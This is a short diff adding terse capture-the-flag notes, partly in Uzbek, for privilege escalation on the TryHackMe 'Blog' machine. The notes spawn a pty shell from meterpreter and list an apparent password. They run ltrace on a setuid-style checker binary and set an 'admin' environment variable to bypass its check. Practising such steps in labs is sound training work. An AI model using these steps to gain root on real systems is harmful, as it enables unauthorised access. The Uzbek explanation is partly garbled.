@@ -1,0 +1,20 @@
+meterpreter> shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+
+
+#/usr/sbin/checker
+admin emasmz!!
+
+#ltrace /usr/sbin/checker
+Uni ishga tushirish, bajariladigan dastur administrator ekanligimizni 
+aniqlash uchun ltracemuhit o'zgaruvchisini ( ) tekshirayotganini ko'rsatadi.
+
+
+#export admin=1
+Keling, muhit o'zgaruvchisini yaratamiz adminva uni quyidagicha o'rnatamiz 1
+
+#/usr/sbin/checker
+
+
+https://www.aldeid.com/wiki/TryHackMe-Blog
